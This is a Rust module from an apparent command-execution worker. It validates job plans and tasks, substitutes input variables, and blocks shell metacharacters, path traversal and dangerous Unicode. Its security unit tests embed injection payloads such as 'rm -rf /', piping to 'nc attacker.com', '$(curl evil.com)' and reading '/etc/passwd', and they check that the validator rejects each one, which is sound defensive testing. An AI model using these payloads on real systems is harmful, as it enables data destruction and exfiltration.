// Allow module inception - this is a common Rust pattern for protocol clients
#![allow(clippy::module_name_repetitions)]

use crate::error::{AgwError, AgwResult};
use once_cell::sync::Lazy;
use regex::Regex;
use serde::{Deserialize, Serialize};

/// Maximum length for job ID
const MAX_JOB_ID_LEN: usize = 128;
/// Maximum length for plan ID
const MAX_PLAN_ID_LEN: usize = 128;
/// Maximum length for plan description
const MAX_PLAN_DESCRIPTION_LEN: usize = 1024;
/// Maximum length for command
const MAX_COMMAND_LEN: usize = 4096;
/// Maximum number of arguments per task
const MAX_ARGS_COUNT: usize = 256;
/// Maximum length for a single argument
const MAX_ARG_LEN: usize = 4096;
/// Maximum number of tasks in a plan
const MAX_TASKS_COUNT: usize = 100;
/// Minimum timeout in seconds
const MIN_TIMEOUT_SECS: u32 = 1;
/// Maximum timeout in seconds (24 hours)
const MAX_TIMEOUT_SECS: u32 = 86400;

/// Dangerous Unicode characters (bidirectional overrides, zero-width)
const DANGEROUS_UNICODE: &[char] = &[
    '\u{202A}', // LEFT-TO-RIGHT EMBEDDING
    '\u{202B}', // RIGHT-TO-LEFT EMBEDDING
    '\u{202C}', // POP DIRECTIONAL FORMATTING
    '\u{202D}', // LEFT-TO-RIGHT OVERRIDE
    '\u{202E}', // RIGHT-TO-LEFT OVERRIDE
    '\u{200B}', // ZERO WIDTH SPACE
    '\u{200C}', // ZERO WIDTH NON-JOINER
    '\u{200D}', // ZERO WIDTH JOINER
    '\u{FEFF}', // ZERO WIDTH NO-BREAK SPACE
];

/// Job metadata (Execution Layer 3)
///
/// A Job is the runtime instance of a Plan execution. It contains the plan reference
/// and input data for variable substitution in tasks.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub struct Job {
    /// Unique job identifier for this execution instance
    pub job_id: String,

    /// Reference to the plan to execute
    pub plan_id: String,

    /// Input data for variable substitution in tasks (e.g., {{input.path}})
    #[serde(default)]
    pub input: serde_json::Value,

    /// Job status (pending, running, completed, failed)
    #[serde(default = "default_job_status")]
    pub status: String,
}

fn default_job_status() -> String {
    "pending".to_string()
}

/// Compiled regex pattern for {{input.field}} variable substitution
/// Uses lazy static initialization for performance (compiled once, reused forever)
static INPUT_PATTERN: Lazy<Regex> =
    Lazy::new(|| Regex::new(r"\{\{input\.([a-zA-Z0-9_]+)\}\}").expect("Invalid regex pattern"));

/// Substitute {{input.field}} variables in a string
///
/// # Errors
///
/// Returns an error if a referenced field doesn't exist in the input data
fn substitute_variables(text: &str, input: &serde_json::Value) -> AgwResult<String> {
    // Use pre-compiled regex pattern
    let re = &*INPUT_PATTERN;

    let mut result = text.to_string();
    let mut missing_fields = Vec::new();

    for cap in re.captures_iter(text) {
        let full_match = &cap[0];
        let field_name = &cap[1];

        // Look up the field in input
        if let Some(value) = input.get(field_name) {
            // Convert value to string
            let replacement = match value {
                serde_json::Value::String(s) => s.clone(),
                serde_json::Value::Number(n) => n.to_string(),
                serde_json::Value::Bool(b) => b.to_string(),
                serde_json::Value::Null => String::new(),
                _ => {
                    return Err(AgwError::Worker(format!(
                        "Input field '{}' has unsupported type (must be string, number, or boolean)",
                        field_name
                    )));
                }
            };

            result = result.replace(full_match, &replacement);
        } else {
            missing_fields.push(field_name.to_string());
        }
    }

    if !missing_fields.is_empty() {
        return Err(AgwError::Worker(format!(
            "Missing required input fields: {}",
            missing_fields.join(", ")
        )));
    }

    Ok(result)
}

impl Job {
    /// Parse a job from JSON string
    ///
    /// # Errors
    ///
    /// Returns an error if the JSON is invalid or doesn't match the Job schema
    pub fn from_json(json: &str) -> Result<Self, serde_json::Error> {
        serde_json::from_str(json)
    }

    /// Validate the job structure
    ///
    /// # Errors
    ///
    /// Returns an error if job_id or plan_id contain invalid characters
    pub fn validate(&self) -> AgwResult<()> {
        // Validate job_id
        validate_string_field(&self.job_id, "job_id", MAX_JOB_ID_LEN, true)?;

        // Validate plan_id
        validate_string_field(&self.plan_id, "plan_id", MAX_PLAN_ID_LEN, true)?;

        Ok(())
    }
}

/// Execution plan containing multiple tasks (Execution Layer 2)
///
/// Plans are templates that can be reused across multiple Jobs.
/// They define the ordered sequence of tasks to execute.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[allow(clippy::struct_field_names)] // Field names match schema specification
pub struct Plan {
    /// Stable plan identifier (reused across multiple job executions)
    pub plan_id: String,

    /// Optional description of plan intent
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub plan_description: Option<String>,

    /// Ordered list of tasks to execute
    pub tasks: Vec<Task>,
}

/// A single task within an execution plan
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
#[allow(clippy::struct_field_names)] // Field names match schema specification
pub struct Task {
    /// 1-based task number (must be contiguous)
    pub task_number: u32,

    /// Command to execute (e.g., "sort", "uniq", "agx-ocr")
    pub command: String,

    /// Command arguments
    #[serde(default)]
    pub args: Vec<String>,

    /// Optional reference to a previous task whose stdout becomes this task's stdin
    #[serde(skip_serializing_if = "Option::is_none")]
    pub input_from_task: Option<u32>,

    /// Optional per-task timeout in seconds
    #[serde(skip_serializing_if = "Option::is_none")]
    pub timeout_secs: Option<u32>,
}

impl Plan {
    /// Parse a plan from JSON string
    ///
    /// # Errors
    ///
    /// Returns an error if the JSON is invalid or doesn't match the Plan schema
    pub fn from_json(json: &str) -> Result<Self, serde_json::Error> {
        serde_json::from_str(json)
    }

    /// Serialize plan to JSON string
    ///
    /// # Errors
    ///
    /// Returns an error if serialization fails
    #[allow(dead_code)] // Used in tests
    pub fn to_json(&self) -> Result<String, serde_json::Error> {
        serde_json::to_string(self)
    }

    /// Validate the plan structure and all tasks
    ///
    /// # Errors
    ///
    /// Returns an error if:
    /// - Any field contains dangerous patterns
    /// - Tasks are empty or exceed maximum count
    /// - Task numbers are not contiguous starting at 1
    /// - `input_from_task` references are invalid
    pub fn validate(&self) -> AgwResult<()> {
        // Validate plan_id
        validate_string_field(&self.plan_id, "plan_id", MAX_PLAN_ID_LEN, true)?;

        // Validate plan_description if present
        if let Some(desc) = &self.plan_description {
            validate_string_field(desc, "plan_description", MAX_PLAN_DESCRIPTION_LEN, false)?;
        }

        // Validate tasks array
        if self.tasks.is_empty() {
            return Err(AgwError::Worker(
                "Plan must contain at least one task".to_string(),
            ));
        }

        if self.tasks.len() > MAX_TASKS_COUNT {
            return Err(AgwError::Worker(format!(
                "Plan exceeds maximum of {MAX_TASKS_COUNT} tasks"
            )));
        }

        // Validate task numbers are contiguous starting at 1
        for (index, task) in self.tasks.iter().enumerate() {
            let expected_task_number = u32::try_from(index + 1)
                .map_err(|_| AgwError::Worker("Task index overflow".to_string()))?;
            if task.task_number != expected_task_number {
                return Err(AgwError::Worker(format!(
                    "Task numbers must be contiguous starting at 1: expected {expected_task_number}, got {}",
                    task.task_number
                )));
            }

            // Validate the task itself
            task.validate()?;

            // Validate input_from_task references
            if let Some(ref_task) = task.input_from_task {
                if ref_task == 0 {
                    return Err(AgwError::Worker("input_from_task must be >= 1".to_string()));
                }
                if ref_task >= task.task_number {
                    return Err(AgwError::Worker(format!(
                        "Task {} has invalid input_from_task {}: cannot reference self or future tasks",
                        task.task_number, ref_task
                    )));
                }
            }
        }

        Ok(())
    }
}

impl Task {
    /// Substitute input variables in task arguments
    ///
    /// Replaces {{input.field}} patterns with values from the job input data.
    /// For example, "{{input.path}}" becomes "/tmp" if job.input = {"path": "/tmp"}
    ///
    /// # Errors
    ///
    /// Returns an error if a referenced field doesn't exist in the input data
    pub fn substitute_input(&self, input: &serde_json::Value) -> AgwResult<Self> {
        let mut substituted_args = Vec::new();

        for arg in &self.args {
            let substituted_arg = substitute_variables(arg, input)?;
            substituted_args.push(substituted_arg);
        }

        Ok(Self {
            task_number: self.task_number,
            command: self.command.clone(),
            args: substituted_args,
            input_from_task: self.input_from_task,
            timeout_secs: self.timeout_secs,
        })
    }

    /// Validate the task fields
    ///
    /// # Errors
    ///
    /// Returns an error if any field contains dangerous patterns or exceeds limits
    pub fn validate(&self) -> AgwResult<()> {
        // Validate command
        validate_string_field(&self.command, "command", MAX_COMMAND_LEN, false)?;
        check_for_dangerous_patterns(&self.command, "command")?;

        // Validate arguments
        if self.args.len() > MAX_ARGS_COUNT {
            return Err(AgwError::Worker(format!(
                "Task {} exceeds maximum of {MAX_ARGS_COUNT} arguments",
                self.task_number
            )));
        }

        for (i, arg) in self.args.iter().enumerate() {
            validate_string_field(arg, &format!("args[{i}]"), MAX_ARG_LEN, false)?;
            check_for_dangerous_patterns(arg, &format!("args[{i}]"))?;
        }

        // Validate timeout if present
        if let Some(timeout) = self.timeout_secs {
            if timeout < MIN_TIMEOUT_SECS {
                return Err(AgwError::Worker(format!(
                    "Task {} timeout must be at least {MIN_TIMEOUT_SECS} seconds",
                    self.task_number
                )));
            }
            if timeout > MAX_TIMEOUT_SECS {
                return Err(AgwError::Worker(format!(
                    "Task {} timeout must not exceed {MAX_TIMEOUT_SECS} seconds",
                    self.task_number
                )));
            }
        }

        Ok(())
    }
}

/// Validate a string field for length and dangerous characters
fn validate_string_field(
    value: &str,
    field_name: &str,
    max_len: usize,
    check_empty: bool,
) -> AgwResult<()> {
    if check_empty && value.is_empty() {
        return Err(AgwError::Worker(format!("{field_name} cannot be empty")));
    }

    if value.len() > max_len {
        return Err(AgwError::Worker(format!(
            "{field_name} exceeds maximum length of {max_len}"
        )));
    }

    // Check for null bytes
    if value.contains('\0') {
        return Err(AgwError::Worker(format!("{field_name} contains null byte")));
    }

    // Check for control characters (except tab and newline which might be legitimate in descriptions)
    for ch in value.chars() {
        if ch.is_control() && ch != '\t' && ch != '\n' {
            return Err(AgwError::Worker(format!(
                "{field_name} contains control character"
            )));
        }
    }

    // Check for dangerous Unicode
    for &dangerous_char in DANGEROUS_UNICODE {
        if value.contains(dangerous_char) {
            return Err(AgwError::Worker(format!(
                "{field_name} contains dangerous Unicode character"
            )));
        }
    }

    Ok(())
}

/// Check for dangerous shell patterns
fn check_for_dangerous_patterns(value: &str, field_name: &str) -> AgwResult<()> {
    let dangerous_chars = ['&', '|', ';', '$', '`', '\n', '\r'];

    for &ch in &dangerous_chars {
        if value.contains(ch) {
            return Err(AgwError::Worker(format!(
                "{field_name} contains dangerous character: '{ch}'"
            )));
        }
    }

    // Path traversal check - precise to avoid false positives like "1..10"
    if value.contains("../") || value.contains("..\\") || value.starts_with("..") {
        return Err(AgwError::Worker(format!(
            "{field_name} contains path traversal sequence"
        )));
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_plan_creation() {
        let plan = Plan {
            plan_id: "plan-456".to_string(),
            plan_description: Some("Test plan".to_string()),
            tasks: vec![Task {
                task_number: 1,
                command: "echo".to_string(),
                args: vec!["hello".to_string()],
                input_from_task: None,
                timeout_secs: Some(30),
            }],
        };

        assert_eq!(plan.plan_id, "plan-456");
        assert_eq!(plan.tasks.len(), 1);
    }

    #[test]
    fn test_plan_json_serialization() {
        let plan = Plan {
            plan_id: "plan-456".to_string(),
            plan_description: None,
            tasks: vec![Task {
                task_number: 1,
                command: "ls".to_string(),
                args: vec!["-la".to_string()],
                input_from_task: None,
                timeout_secs: Some(30),
            }],
        };

        let json = plan.to_json().unwrap();
        let parsed = Plan::from_json(&json).unwrap();
        assert_eq!(plan, parsed);
    }

    #[test]
    fn test_plan_with_multiple_steps() {
        let plan = Plan {
            plan_id: "plan-456".to_string(),
            plan_description: Some("Multi-step plan".to_string()),
            tasks: vec![
                Task {
                    task_number: 1,
                    command: "sort".to_string(),
                    args: vec!["-r".to_string()],
                    input_from_task: None,
                    timeout_secs: Some(30),
                },
                Task {
                    task_number: 2,
                    command: "uniq".to_string(),
                    args: vec![],
                    input_from_task: Some(1),
                    timeout_secs: Some(30),
                },
            ],
        };

        assert_eq!(plan.tasks.len(), 2);
        assert_eq!(plan.tasks[1].input_from_task, Some(1));
    }

    #[test]
    fn test_plan_validation_success() {
        let plan = Plan {
            plan_id: "plan-456".to_string(),
            plan_description: Some("Valid plan".to_string()),
            tasks: vec![
                Task {
                    task_number: 1,
                    command: "echo".to_string(),
                    args: vec!["test".to_string()],
                    input_from_task: None,
                    timeout_secs: Some(30),
                },
                Task {
                    task_number: 2,
                    command: "wc".to_string(),
                    args: vec!["-l".to_string()],
                    input_from_task: Some(1),
                    timeout_secs: Some(30),
                },
            ],
        };

        assert!(plan.validate().is_ok());
    }

    #[test]
    fn test_plan_validation_empty_tasks() {
        let plan = Plan {
            plan_id: "plan-456".to_string(),
            plan_description: None,
            tasks: vec![],
        };

        assert!(plan.validate().is_err());
    }

    #[test]
    fn test_plan_validation_non_contiguous_tasks() {
        let plan = Plan {
            plan_id: "plan-456".to_string(),
            plan_description: None,
            tasks: vec![
                Task {
                    task_number: 1,
                    command: "echo".to_string(),
                    args: vec![],
                    input_from_task: None,
                    timeout_secs: None,
                },
                Task {
                    task_number: 3, // Skip 2
                    command: "wc".to_string(),
                    args: vec![],
                    input_from_task: None,
                    timeout_secs: None,
                },
            ],
        };

        assert!(plan.validate().is_err());
    }

    #[test]
    fn test_plan_validation_invalid_input_from_task() {
        let plan = Plan {
            plan_id: "plan-456".to_string(),
            plan_description: None,
            tasks: vec![
                Task {
                    task_number: 1,
                    command: "echo".to_string(),
                    args: vec![],
                    input_from_task: None,
                    timeout_secs: None,
                },
                Task {
                    task_number: 2,
                    command: "wc".to_string(),
                    args: vec![],
                    input_from_task: Some(2), // Cannot reference self
                    timeout_secs: None,
                },
            ],
        };

        assert!(plan.validate().is_err());
    }

    #[test]
    fn test_task_validation_command_injection() {
        let task = Task {
            task_number: 1,
            command: "ls; rm -rf /".to_string(),
            args: vec![],
            input_from_task: None,
            timeout_secs: None,
        };

        assert!(task.validate().is_err());
    }

    #[test]
    fn test_task_validation_timeout_too_low() {
        let task = Task {
            task_number: 1,
            command: "sleep".to_string(),
            args: vec!["10".to_string()],
            input_from_task: None,
            timeout_secs: Some(0),
        };

        assert!(task.validate().is_err());
    }

    // ===== Unit tests for substitute_variables() =====

    #[test]
    fn test_substitute_variables_single_field() {
        use serde_json::json;
        let input = json!({"path": "/tmp/test.txt"});
        let result = substitute_variables("cat {{input.path}}", &input).unwrap();
        assert_eq!(result, "cat /tmp/test.txt");
    }

    #[test]
    fn test_substitute_variables_multiple_fields() {
        use serde_json::json;
        let input = json!({"src": "/tmp/source", "dest": "/tmp/dest"});
        let result = substitute_variables("cp {{input.src}} {{input.dest}}", &input).unwrap();
        assert_eq!(result, "cp /tmp/source /tmp/dest");
    }

    #[test]
    fn test_substitute_variables_same_field_multiple_times() {
        use serde_json::json;
        let input = json!({"file": "test.txt"});
        let result =
            substitute_variables("echo {{input.file}} && cat {{input.file}}", &input).unwrap();
        assert_eq!(result, "echo test.txt && cat test.txt");
    }

    #[test]
    fn test_substitute_variables_number_value() {
        use serde_json::json;
        let input = json!({"count": 42});
        let result = substitute_variables("head -n {{input.count}}", &input).unwrap();
        assert_eq!(result, "head -n 42");
    }

    #[test]
    fn test_substitute_variables_boolean_value() {
        use serde_json::json;
        let input = json!({"verbose": true});
        let result = substitute_variables("flag={{input.verbose}}", &input).unwrap();
        assert_eq!(result, "flag=true");
    }

    #[test]
    fn test_substitute_variables_null_value() {
        use serde_json::json;
        let input = json!({"optional": null});
        let result = substitute_variables("value={{input.optional}}", &input).unwrap();
        assert_eq!(result, "value=");
    }

    #[test]
    fn test_substitute_variables_missing_field() {
        use serde_json::json;
        let input = json!({"path": "/tmp/test"});
        let result = substitute_variables("cat {{input.missing_field}}", &input);
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("missing_field"));
    }

    #[test]
    fn test_substitute_variables_multiple_missing_fields() {
        use serde_json::json;
        let input = json!({"path": "/tmp/test"});
        let result = substitute_variables("cmd {{input.field1}} {{input.field2}}", &input);
        assert!(result.is_err());
        let err_msg = result.unwrap_err().to_string();
        assert!(err_msg.contains("field1"));
        assert!(err_msg.contains("field2"));
    }

    #[test]
    fn test_substitute_variables_unsupported_type_array() {
        use serde_json::json;
        let input = json!({"items": [1, 2, 3]});
        let result = substitute_variables("process {{input.items}}", &input);
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("unsupported type"));
    }

    #[test]
    fn test_substitute_variables_unsupported_type_object() {
        use serde_json::json;
        let input = json!({"config": {"key": "value"}});
        let result = substitute_variables("load {{input.config}}", &input);
        assert!(result.is_err());
        assert!(result.unwrap_err().to_string().contains("unsupported type"));
    }

    #[test]
    fn test_substitute_variables_no_substitutions() {
        use serde_json::json;
        let input = json!({"path": "/tmp/test"});
        let result = substitute_variables("echo hello world", &input).unwrap();
        assert_eq!(result, "echo hello world");
    }

    #[test]
    fn test_substitute_variables_empty_string() {
        use serde_json::json;
        let input = json!({"path": "/tmp/test"});
        let result = substitute_variables("", &input).unwrap();
        assert_eq!(result, "");
    }

    #[test]
    fn test_substitute_variables_field_name_with_numbers() {
        use serde_json::json;
        let input = json!({"file123": "test.txt"});
        let result = substitute_variables("cat {{input.file123}}", &input).unwrap();
        assert_eq!(result, "cat test.txt");
    }

    #[test]
    fn test_substitute_variables_field_name_with_underscores() {
        use serde_json::json;
        let input = json!({"source_file": "input.txt"});
        let result = substitute_variables("cat {{input.source_file}}", &input).unwrap();
        assert_eq!(result, "cat input.txt");
    }

    #[test]
    fn test_task_substitute_input() {
        use serde_json::json;
        let task = Task {
            task_number: 1,
            command: "cat".to_string(),
            args: vec!["{{input.path}}".to_string(), "-n".to_string()],
            input_from_task: None,
            timeout_secs: Some(30),
        };

        let input = json!({"path": "/tmp/test.txt"});
        let result = task.substitute_input(&input).unwrap();

        assert_eq!(result.args[0], "/tmp/test.txt");
        assert_eq!(result.args[1], "-n");
    }

    #[test]
    fn test_task_substitute_input_multiple_args() {
        use serde_json::json;
        let task = Task {
            task_number: 1,
            command: "cp".to_string(),
            args: vec!["{{input.src}}".to_string(), "{{input.dest}}".to_string()],
            input_from_task: None,
            timeout_secs: Some(30),
        };

        let input = json!({"src": "/tmp/a", "dest": "/tmp/b"});
        let result = task.substitute_input(&input).unwrap();

        assert_eq!(result.args[0], "/tmp/a");
        assert_eq!(result.args[1], "/tmp/b");
    }

    // ===== Security tests for input substitution =====

    #[test]
    fn test_security_command_injection_after_substitution() {
        use serde_json::json;
        let task = Task {
            task_number: 1,
            command: "cat".to_string(),
            args: vec!["{{input.path}}".to_string()],
            input_from_task: None,
            timeout_secs: Some(30),
        };

        // Attempt command injection via input
        let malicious_input = json!({"path": "/tmp/file; rm -rf /"});
        let substituted_task = task.substitute_input(&malicious_input).unwrap();

        // Validation should catch the semicolon
        assert!(
            substituted_task.validate().is_err(),
            "Command injection via semicolon should be detected"
        );
    }

    #[test]
    fn test_security_pipe_injection_after_substitution() {
        use serde_json::json;
        let task = Task {
            task_number: 1,
            command: "cat".to_string(),
            args: vec!["{{input.file}}".to_string()],
            input_from_task: None,
            timeout_secs: Some(30),
        };

        let malicious_input = json!({"file": "test.txt | nc attacker.com 1234"});
        let substituted_task = task.substitute_input(&malicious_input).unwrap();

        assert!(
            substituted_task.validate().is_err(),
            "Pipe injection should be detected"
        );
    }

    #[test]
    fn test_security_path_traversal_after_substitution() {
        use serde_json::json;
        let task = Task {
            task_number: 1,
            command: "cat".to_string(),
            args: vec!["{{input.path}}".to_string()],
            input_from_task: None,
            timeout_secs: Some(30),
        };

        let malicious_input = json!({"path": "../../../etc/passwd"});
        let substituted_task = task.substitute_input(&malicious_input).unwrap();

        assert!(
            substituted_task.validate().is_err(),
            "Path traversal should be detected"
        );
    }

    #[test]
    fn test_security_backtick_substitution_injection() {
        use serde_json::json;
        let task = Task {
            task_number: 1,
            command: "echo".to_string(),
            args: vec!["{{input.value}}".to_string()],
            input_from_task: None,
            timeout_secs: Some(30),
        };

        let malicious_input = json!({"value": "`whoami`"});
        let substituted_task = task.substitute_input(&malicious_input).unwrap();

        assert!(
            substituted_task.validate().is_err(),
            "Backtick command substitution should be detected"
        );
    }

    #[test]
    fn test_security_dollar_substitution_injection() {
        use serde_json::json;
        let task = Task {
            task_number: 1,
            command: "echo".to_string(),
            args: vec!["{{input.value}}".to_string()],
            input_from_task: None,
            timeout_secs: Some(30),
        };

        let malicious_input = json!({"value": "$(curl evil.com)"});
        let substituted_task = task.substitute_input(&malicious_input).unwrap();

        assert!(
            substituted_task.validate().is_err(),
            "Dollar command substitution should be detected"
        );
    }

    #[test]
    fn test_security_newline_injection() {
        use serde_json::json;
        let task = Task {
            task_number: 1,
            command: "cat".to_string(),
            args: vec!["{{input.file}}".to_string()],
            input_from_task: None,
            timeout_secs: Some(30),
        };

        let malicious_input = json!({"file": "test.txt\nrm -rf /"});
        let substituted_task = task.substitute_input(&malicious_input).unwrap();

        assert!(
            substituted_task.validate().is_err(),
            "Newline injection should be detected"
        );
    }

    #[test]
    fn test_security_null_byte_injection() {
        use serde_json::json;
        let task = Task {
            task_number: 1,
            command: "cat".to_string(),
            args: vec!["{{input.file}}".to_string()],
            input_from_task: None,
            timeout_secs: Some(30),
        };

        let malicious_input = json!({"file": "test.txt\0malicious"});
        let substituted_task = task.substitute_input(&malicious_input).unwrap();

        assert!(
            substituted_task.validate().is_err(),
            "Null byte injection should be detected"
        );
    }

    #[test]
    fn test_security_dangerous_unicode_after_substitution() {
        use serde_json::json;
        let task = Task {
            task_number: 1,
            command: "echo".to_string(),
            args: vec!["{{input.text}}".to_string()],
            input_from_task: None,
            timeout_secs: Some(30),
        };

        // Right-to-left override character
        let malicious_input = json!({"text": "test\u{202E}malicious"});
        let substituted_task = task.substitute_input(&malicious_input).unwrap();

        assert!(
            substituted_task.validate().is_err(),
            "Dangerous Unicode should be detected"
        );
    }

    #[test]
    fn test_security_safe_input_passes_validation() {
        use serde_json::json;
        let task = Task {
            task_number: 1,
            command: "cat".to_string(),
            args: vec!["{{input.path}}".to_string()],
            input_from_task: None,
            timeout_secs: Some(30),
        };

        // Safe input should pass validation
        let safe_input = json!({"path": "/tmp/test_file_123.txt"});
        let substituted_task = task.substitute_input(&safe_input).unwrap();

        assert!(
            substituted_task.validate().is_ok(),
            "Safe input should pass validation"
        );
    }

    #[test]
    fn test_security_multiple_safe_args_pass_validation() {
        use serde_json::json;
        let task = Task {
            task_number: 1,
            command: "cp".to_string(),
            args: vec![
                "{{input.src}}".to_string(),
                "{{input.dest}}".to_string(),
                "-v".to_string(),
            ],
            input_from_task: None,
            timeout_secs: Some(30),
        };

        let safe_input = json!({"src": "/tmp/source.txt", "dest": "/tmp/destination.txt"});
        let substituted_task = task.substitute_input(&safe_input).unwrap();

        assert!(
            substituted_task.validate().is_ok(),
            "Safe multi-arg input should pass validation"
        );
    }
}
